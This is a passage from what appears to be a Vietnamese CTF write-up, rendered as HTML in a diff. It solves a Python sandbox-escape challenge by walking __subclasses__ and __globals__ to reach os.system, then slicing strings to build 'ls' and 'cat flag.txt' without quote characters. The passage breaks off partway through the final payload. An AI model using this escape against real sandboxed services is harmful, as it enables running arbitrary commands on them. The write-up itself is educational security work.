&#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;zipimport._ZipImportResourceReader&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;]&#34;</span>
+
+data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>)
+
+index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> data:
+    <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;_wrap_close&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;index: {}&#34;</span><span style="color:#f92672">.</span>format(index))
+        <span style="color:#66d9ef">print</span>(i)
+    index <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</code></pre></div><p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/python-test.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/python-test.png"></p>
+<p>OK, vậy là vị trí của <code>&lt;class 'os._wrap_close'&gt;</code> là 132. Chúng ta xem nó có thể gọi được những hàm/module global nào nha.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.30.29.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.30.29.png"></p>
+<p>Đó là tất cả các hàm global có thể gọi, chúng to có thể xem được các hàm global, đồng nghĩa với việc có thể tìm được các hàm để có thể chạy command code. Hàm tôi hướng tới là <code>buils in system</code>.</p>
+<p>Vậy thì trong rất nhiều class/func global đó, tôi đã tìm được vị trí của <code>buils in system</code> ở vị trí 45. Vì giá trị của globals trả về là một dict gồm, <code>key</code> là class, <code>value</code> là class. Ví dụ:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#e6db74">&#39;_wrap_close&#39;</span>: <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">os</span><span style="color:#f92672">.</span>_wrap_close<span style="color:#e6db74">&#39;&gt;</span>
+</code></pre></div><p>Nên ta cần biến đổi một tý. Chuyển đổi tất cả values thành 1 mảng</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">[(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">132</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()]
+</code></pre></div><p>Sau khi chuyển đổi, dữ liệu sẽ như vầy.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">(<span style="color:#e6db74">&#39;_wrap_close&#39;</span>, <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">os</span><span style="color:#f92672">.</span>_wrap_close<span style="color:#e6db74">&#39;&gt;)</span>
+</code></pre></div><p>Bây giờ thì xem vị trí 45 có gì nào.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">[(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">132</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">45</span>]
+</code></pre></div><p>Nhớ thêm <code>print</code> và và thử chạy xem như nào nhé.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.33.46.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.33.46.png"></p>
+<p>Chúng ta đã có được một tuple, vậy thì để lấy được function system, chúng ta lấy vị trí 1 nhé.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">[(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">132</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">45</span>][<span style="color:#ae81ff">1</span>]
+</code></pre></div><p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.35.09.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.35.09.png"></p>
+<p>Đó, đã có được hàm <code>system</code> nha, Bây giờ chỉ cần chạy</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># [(k,v) for k,v in ().__class__.__base__.__subclasses__()[132].__init__.__globals__.items()][45][1](&#34;&lt;&lt;command&gt;&gt;&#34;)</span>
+
+[(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">132</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">45</span>][<span style="color:#ae81ff">1</span>](<span style="color:#e6db74">&#34;ls&#34;</span>)
+</code></pre></div><p>Là có thể chạy lệnh command, tuy nhiên server đã chặn <code>&quot;</code> và <code>'</code></p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.47.43.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.47.43.png"></p>
+<p>Bắt buộc tôi phải tìm cách khác, đó là sử dụng những dữ liệu server trả về dùng phương pháp cắt chuỗi, cộng chuỗi, &hellip; để tạo thành một lệnh command. Vì dữ liệu trả về có cả String, ta có thể thoải mái sử dụng chúng.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.46.52.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.46.52.png"></p>
+<p>Để cắt chuỗi để có <code>ls</code>. Dùng để xác định xem folder run code có những file gì.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">s <span style="color:#f92672">-&gt;</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>:][<span style="color:#ae81ff">0</span>]
+l <span style="color:#f92672">-&gt;</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">9</span>]
+
+ls <span style="color:#f92672">-&gt;</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>:][<span style="color:#ae81ff">0</span>]
+</code></pre></div><p>Tôi thử chạy <code>ls</code> thử nha.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span>([(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">132</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">45</span>][<span style="color:#ae81ff">1</span>]([(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>:][<span style="color:#ae81ff">0</span>]))
+</code></pre></div><p>Ok, đã chạy được, thấy được file <code>flag.txt</code> rồi.</p>
+<p><img src="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.38.49.png" alt="/images/posts/ctf/Cyber-Apocalypse-2021/misc/Screen_Shot_2021-04-24_at_22.38.49.png"></p>
+<p>Bây giờ cắt chuỗi tiếp để có thể tìm ra chuỗi: &ldquo;cat flag.txt&rdquo;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">c <span style="color:#f92672">-&gt;</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">5</span>]
+a <span style="color:#f92672">-&gt;</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">4</span>]
+t <span style="color:#f92672">-&gt;</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">4</span>]
+
+f <span style="color:#f92672">-&gt;</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">5</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">3</span>]
+g <span style="color:#f92672">-&gt;</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">2</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">7</span>:<span style="color:#ae81ff">8</span>]
+<span style="color:#f92672">.</span> <span style="color:#f92672">-&gt;</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">6</span>][<span style="color:#ae81ff">1</span>][<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>]
+x <span style="color:#f92672">-&gt;</span> [i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>][<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>values()][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">22</span>]
+space <span style="color:#f92672">-&gt;</span>  [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">5</span>]
+</code></pre></div><p>Bây giờ ghép thành được chuỗi <code>cat flag.txt</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">5</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">5</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">5</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">2</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">7</span>:<span style="color:#ae81ff">8</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">6</span>][<span style="color:#ae81ff">1</span>][<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> [i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>][<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>values()][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">22</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">4</span>]
+</code></pre></div><p>Payload cuối cùng là.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span>([(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">132</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">45</span>][<span style="color:#ae81ff">1</span>]([(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">5</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">3</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">5</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">5</span>][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> [(k,v) <span style="color:#66d9ef">for</span> k,v <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>items()][<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> 